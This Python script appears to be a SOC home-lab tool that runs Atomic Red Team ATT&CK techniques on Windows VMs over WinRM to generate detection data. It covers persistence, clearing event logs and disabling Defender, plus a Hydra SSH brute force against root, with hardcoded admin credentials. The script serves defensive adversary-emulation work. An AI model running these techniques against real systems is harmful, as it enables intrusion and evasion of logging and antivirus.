#!/usr/bin/env python3
"""
Automated Attack Generator — SOC Home Lab
Wraps Atomic Red Team (Invoke-AtomicRedTeam) via PowerShell remoting
to programmatically execute MITRE ATT&CK techniques on target VMs.

Usage:
    python auto_attack_gen.py --target 192.168.1.101 --techniques all
    python auto_attack_gen.py --target 192.168.1.101 --techniques T1053.005,T1547.001
    python auto_attack_gen.py --list

Requirements:
    - Atomic Red Team installed on target Windows VM
    - WinRM enabled on target: Enable-PSRemoting -Force
    - pip install pywinrm
"""

import argparse
import subprocess
import time
import json
import logging
from datetime import datetime

# --- Configuration ---
WINRM_USER = "Administrator"           # Target VM credentials
WINRM_PASS = "P@ssword123"            # Change before use
ART_PATH   = "C:\\AtomicRedTeam"       # ART install path on target

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(message)s",
    handlers=[
        logging.FileHandler(f"attack_log_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"),
        logging.StreamHandler()
    ]
)
log = logging.getLogger(__name__)

# Techniques to simulate: {MITRE_ID: description}
TECHNIQUES = {
    "T1053.005": "Scheduled Task Persistence",
    "T1547.001": "Registry Run Key Persistence",
    "T1059.001": "PowerShell Execution",
    "T1070.001": "Clear Windows Event Logs",
    "T1110.001": "Brute Force - SSH (run from Kali)",
    "T1562.001": "Disable Windows Defender",
}


def run_atomic(target_ip: str, technique_id: str, cleanup: bool = True) -> dict:
    """
    Execute a single Atomic Red Team technique on the remote target via WinRM.
    Returns a result dict with status and output.
    """
    ps_command = f"""
    Import-Module "{ART_PATH}\\invoke-atomicredteam\\Invoke-AtomicRedTeam.psd1" -Force
    Invoke-AtomicTest {technique_id} -TimeoutSeconds 60
    """

    if cleanup:
        ps_command += f"\nInvoke-AtomicTest {technique_id} -Cleanup"

    try:
        import winrm
        session = winrm.Session(
            target=target_ip,
            auth=(WINRM_USER, WINRM_PASS),
            transport="ntlm",
            server_cert_validation="ignore"
        )
        result = session.run_ps(ps_command)
        status = "success" if result.status_code == 0 else "failed"
        output = result.std_out.decode(errors="replace")
        err    = result.std_err.decode(errors="replace")
        return {"technique": technique_id, "status": status, "output": output, "error": err}

    except Exception as e:
        log.error(f"[{technique_id}] WinRM error: {e}")
        return {"technique": technique_id, "status": "error", "output": "", "error": str(e)}


def run_brute_force_ssh(target_ip: str, wordlist: str = "/usr/share/wordlists/rockyou.txt"):
    """
    T1110.001 — SSH brute force via Hydra (run this from Kali attacker VM).
    """
    log.info(f"[T1110.001] Launching SSH brute force against {target_ip}")
    cmd = ["hydra", "-l", "root", "-P", wordlist, target_ip, "ssh", "-t", "4", "-f"]
    subprocess.run(cmd, capture_output=False)


def main():
    parser = argparse.ArgumentParser(description="SOC Lab Automated Attack Generator")
    parser.add_argument("--target",     default="192.168.1.101", help="Target VM IP")
    parser.add_argument("--techniques", default="all",            help="Comma-separated MITRE IDs or 'all'")
    parser.add_argument("--no-cleanup", action="store_true",      help="Skip ART cleanup phase")
    parser.add_argument("--delay",      type=int, default=10,     help="Seconds between techniques (default: 10)")
    parser.add_argument("--list",       action="store_true",      help="List available techniques and exit")
    args = parser.parse_args()

    if args.list:
        print("\nAvailable techniques:")
        for tid, desc in TECHNIQUES.items():
            print(f"  {tid}  —  {desc}")
        return

    selected = list(TECHNIQUES.keys()) if args.techniques == "all" \
               else [t.strip() for t in args.techniques.split(",")]

    log.info(f"Target: {args.target}")
    log.info(f"Techniques: {selected}")
    log.info(f"Cleanup: {not args.no_cleanup}")
    log.info("=" * 50)

    results = []
    for technique in selected:
        if technique not in TECHNIQUES:
            log.warning(f"Unknown technique: {technique}, skipping.")
            continue

        log.info(f"[*] Executing {technique} — {TECHNIQUES[technique]}")

        # SSH brute force runs locally on Kali, not via WinRM
        if technique == "T1110.001":
            run_brute_force_ssh(args.target)
            results.append({"technique": technique, "status": "launched"})
        else:
            result = run_atomic(args.target, technique, cleanup=not args.no_cleanup)
            results.append(result)
            log.info(f"    Status: {result['status']}")
            if result.get("error"):
                log.warning(f"    Error: {result['error'][:200]}")

        time.sleep(args.delay)

    # Save results
    out_file = f"results_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
    with open(out_file, "w") as f:
        json.dump(results, f, indent=2)

    success = sum(1 for r in results if r["status"] == "success")
    log.info("=" * 50)
    log.info(f"Done. {success}/{len(results)} techniques executed successfully.")
    log.info(f"Results saved to {out_file}")


if __name__ == "__main__":
    main()
